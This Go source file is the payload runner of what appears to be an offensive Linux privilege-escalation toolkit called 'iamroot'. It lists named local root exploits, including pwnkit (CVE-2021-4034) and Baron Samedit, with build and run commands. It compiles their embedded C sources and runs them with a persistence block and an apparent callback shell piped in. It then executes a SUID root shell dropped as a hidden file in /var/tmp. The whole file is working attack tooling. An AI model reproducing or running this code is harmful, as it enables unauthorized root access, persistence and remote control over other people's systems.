package payload

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/cleissonamanacio/iamroot/internal/callback"
	"github.com/cleissonamanacio/iamroot/internal/exploit"
	"github.com/cleissonamanacio/iamroot/internal/persist"
	"github.com/cleissonamanacio/iamroot/internal/sysutil"
	"github.com/cleissonamanacio/iamroot/payloads"
)

type Spec struct {
	Name          string
	Sources       []string
	Build         []string
	RunCmd        []string
	PrebuiltSub   string
	SuidShell     string
	ExtraSetup    []string
	NeedPkgConfig bool
}

const defaultSuidShell = "/var/tmp/.iamroot_rootbash"

var specs = map[string]Spec{
	"pwnkit": {
		Name:    "pwnkit",
		Sources: []string{"pwnkit.c", "pwnkit_main.c"},
		ExtraSetup: []string{
			"mkdir -p gconv",
			"printf 'module UTF-8// PWNKIT// pwnkit 1\\n' > gconv/gconv-modules",
		},
		Build: []string{
			`$CC -O2 -shared -fPIC -nostartfiles -fno-stack-protector -o gconv/pwnkit.so pwnkit.c`,
			`$CC -O2 -o cve-2021-4034 pwnkit_main.c`,
		},
		RunCmd:      []string{"./cve-2021-4034"},
		PrebuiltSub: "pwnkit/cve-2021-4034",
	},
	"baron_samedit": {
		Name:    "baron_samedit",
		Sources: []string{"hax.c", "libnss_evil.c"},
		Build: []string{
			`$CC -O2 -shared -fPIC -o libnss_evil.so.2 libnss_evil.c`,
			`$CC -std=gnu99 -O2 -o hax hax.c -DOFFSET=0x10 -DCHUNK=0x50 -DNMATCH=60`,
		},
		RunCmd:      []string{"./hax"},
		PrebuiltSub: "baron_samedit/hax",
	},
	"copyfail": {
		Name:        "copyfail",
		Sources:     []string{"copyfail.c"},
		Build:       []string{`$CC -O2 -o copy_fail copyfail.c`},
		RunCmd:      []string{"./copy_fail"},
		PrebuiltSub: "copy_fail/copy_fail",
		SuidShell:   "/var/tmp/.rootbash_cf",
	},
	"dirty_frag": {
		Name:        "dirty_frag",
		Sources:     []string{"dirty_frag.c"},
		Build:       []string{`$CC -O2 -o dirty_frag dirty_frag.c`},
		RunCmd:      []string{"./dirty_frag"},
		PrebuiltSub: "dirty_frag/dirty_frag",
		SuidShell:   "/var/tmp/.rootbash_df",
	},
	"fragnesia": {
		Name:        "fragnesia",
		Sources:     []string{"fragnesia.c"},
		Build:       []string{`$CC -O2 -o fragnesia fragnesia.c`},
		RunCmd:      []string{"./fragnesia"},
		PrebuiltSub: "fragnesia/fragnesia",
		SuidShell:   "/var/tmp/.rootsh_fg",
	},
	"dirty_clone": {
		Name:        "dirty_clone",
		Sources:     []string{"dirty_clone.c"},
		Build:       []string{`$CC -O2 -o dirty_clone dirty_clone.c`},
		RunCmd:      []string{"./dirty_clone"},
		PrebuiltSub: "dirty_clone/dirty_clone",
		SuidShell:   "/var/tmp/.rootbash_dc",
	},
	"pedit_cow": {
		Name:        "pedit_cow",
		Sources:     []string{"pedit_cow.c"},
		Build:       []string{`$CC -O2 -o pedit_cow pedit_cow.c`},
		RunCmd:      []string{"./pedit_cow"},
		PrebuiltSub: "pedit_cow/pedit_cow",
		SuidShell:   "/var/tmp/.rootbash_pc",
	},
	"cgroup_uaf": {
		Name:        "cgroup_uaf",
		Sources:     []string{"cgroup_uaf.c"},
		Build:       []string{`$CC -O2 -o cgroup_uaf cgroup_uaf.c`},
		RunCmd:      []string{"./cgroup_uaf"},
		PrebuiltSub: "cgroup_uaf/cgroup_uaf",
		SuidShell:   "/var/tmp/.rootbash_cg",
	},
	"ptrace_cred": {
		Name:        "ptrace_cred",
		Sources:     []string{"ptrace_cred.c"},
		Build:       []string{`$CC -O2 -o ptrace_cred ptrace_cred.c -lpthread`},
		RunCmd:      []string{"./ptrace_cred"},
		PrebuiltSub: "ptrace/ptrace_cred",
	},
	"pack2theroot": {
		Name:          "pack2theroot",
		Sources:       []string{"cve-2026-41651.c"},
		Build:         []string{`$CC -O2 -o cve-2026-41651 cve-2026-41651.c $(pkg-config --cflags --libs glib-2.0 gio-2.0)`},
		RunCmd:        []string{"./cve-2026-41651"},
		PrebuiltSub:   "pack2theroot/cve-2026-41651",
		SuidShell:     "/var/tmp/.suid_bash",
		NeedPkgConfig: true,
	},
}

func Has(name string) bool { _, ok := specs[name]; return ok }

func Available() bool { return payloads.Available() }

func Ready(name string) bool {
	s, ok := specs[name]
	if !ok {
		return false
	}
	if s.PrebuiltSub != "" && exploit.FindExploitBinary(s.PrebuiltSub) != "" {
		return true
	}
	if exploit.FindCompiler() == "" {
		return false
	}
	if s.NeedPkgConfig && !exploit.CommandExists("pkg-config") {
		return false
	}
	return true
}

func dir(s Spec) (string, error) {
	d := filepath.Join(exploit.WorkDir(), "payloads", s.Name)
	if err := os.MkdirAll(d, 0o755); err != nil {
		return "", err
	}
	srcs, err := payloads.Decode()
	if err != nil {
		return "", fmt.Errorf("payload bundle: %w", err)
	}
	for _, f := range s.Sources {
		data, ok := srcs[f]
		if !ok {
			return "", fmt.Errorf("payload bundle missing %s", f)
		}
		if err := os.WriteFile(filepath.Join(d, f), data, 0o644); err != nil {
			return "", err
		}
	}
	return d, nil
}

func Run(name, persistUser string) bool {
	s, ok := specs[name]
	if !ok {
		fmt.Fprintf(os.Stderr, "[-] payload %s: unknown\n", name)
		return false
	}

	runDir := ""
	argv := s.RunCmd
	if pre := exploit.FindExploitBinary(s.PrebuiltSub); pre != "" {
		fmt.Printf("[+] %s: using pre-built payload %s\n", s.Name, pre)
		runDir = filepath.Dir(pre)
		argv = []string{pre}
	} else {

		cc := exploit.FindCompiler()
		if cc == "" {
			fmt.Fprintf(os.Stderr,
				"[-] %s: no pre-built binary and no gcc — upload one to %s/%s\n",
				s.Name, exploit.WorkDir(), s.PrebuiltSub)
			return false
		}
		d, err := dir(s)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] %s: %v\n", s.Name, err)
			return false
		}
		for _, cmd := range s.ExtraSetup {
			c := exec.Command("sh", "-c", cmd)
			c.Dir = d
			if c.Run() != nil {
				fmt.Fprintf(os.Stderr, "[-] %s: setup failed: %s\n", s.Name, cmd)
				return false
			}
		}
		for _, cmd := range s.Build {
			full := strings.ReplaceAll(cmd, "$CC", cc)
			c := exec.Command("sh", "-c", full)
			c.Dir = d
			if out, err := c.CombinedOutput(); err != nil {
				fmt.Fprintf(os.Stderr, "[-] %s: build failed: %s\n%s\n", s.Name, full, out)
				return false
			}
		}
		fmt.Printf("[+] %s: compiled from embedded source\n", s.Name)
		runDir = d
	}

	stdin := persist.Block(persistUser) + "\n" + callback.ShellBlock() + "\nexit\n"
	cmd := exec.Command(argv[0], argv[1:]...)
	cmd.Dir = runDir
	cmd.Stdin = strings.NewReader(stdin)
	sysutil.Detach(cmd)
	if out, err := cmd.CombinedOutput(); err != nil {

		fmt.Fprintf(os.Stderr, "[*] %s: exited (%v)\n%s\n", s.Name, err, out)
	}

	for _, cand := range []string{s.SuidShell, defaultSuidShell} {
		if cand != "" {
			if fi, err := os.Stat(cand); err == nil && fi.Mode()&os.ModeSetuid != 0 {
				return exploit.VerifyAndExec(cand)
			}
		}
	}

	if os.Getuid() == 0 || os.Geteuid() == 0 {
		return true
	}
	fmt.Fprintf(os.Stderr, "[-] %s: no SUID artifact after run\n", s.Name)
	return false
}
